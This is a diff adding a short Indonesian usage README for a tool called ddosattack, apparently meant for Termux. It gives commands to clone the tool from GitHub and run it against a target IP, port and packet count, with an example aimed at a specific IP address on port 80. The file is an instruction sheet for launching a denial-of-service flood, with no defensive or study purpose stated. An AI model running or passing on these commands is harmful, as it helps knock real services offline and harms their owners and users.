@@ -1,0 +1,18 @@
+# CARA PENGGUNAAN #
+
+$ pkg update && pkg upgrade
+$ pkg install python2
+$ pkg install git
+$ git clone https://github.com/oxlynx/ddosattack
+$ ls
+$ cd ddosattack
+$ python2 ddosattack.py
+$ python2 ddosattack.py [IP] [PORT] [PACKET]
+CONTOH :
+python2 ddosattack.py 147.237.0.206 80 135
+
+PORT DEFAULT : 80
+PACKET DEFAULT : 135
+
+
+Creator : OxLynx
